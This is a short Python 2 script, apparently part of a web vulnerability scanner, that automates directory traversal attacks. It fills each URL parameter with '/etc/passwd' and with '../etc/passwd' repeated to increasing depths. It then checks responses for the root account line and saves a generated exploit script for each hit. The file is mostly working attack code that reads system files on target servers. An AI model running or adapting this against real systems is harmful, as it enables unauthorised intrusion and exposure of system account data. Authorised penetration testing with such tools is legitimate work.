import requests
from generator import render, generator
from utility import *

banner(DT)

feeds = ['etc/passwd']
nuggets = ['root:x:0:0:root:/root:/bin/bash']

collector = {}

DT_generator = generator(DT)

method = 'GET'
results = read_results()

for result in results:
    link = result['link']
    url = get_url(link)
    params = get_params(url)
    hit = False
    for feed in feeds:
        depth = 10
        i = 0
        while i < depth and not hit:
            if i == 0:
                value = '/' + feed
            else:
                value = i * '../' + feed
            for p in params:
                params[p] = value
                fullURL = generate_url_with_params(url, params)
                req = requests.get(fullURL)
                for nugget in nuggets:
                    if not hit and req.content.find(nugget) != -1:
                        hit = True
                        endpoint = url.path
                        scope, script = render[DT](endpoint,params,method)
                        DT_generator.updateScope(scope)
                        DT_generator.saveScript(script)                        
                        success_message(fullURL)
            i = i + 1
            
DT_generator.saveScope()

print '\n'
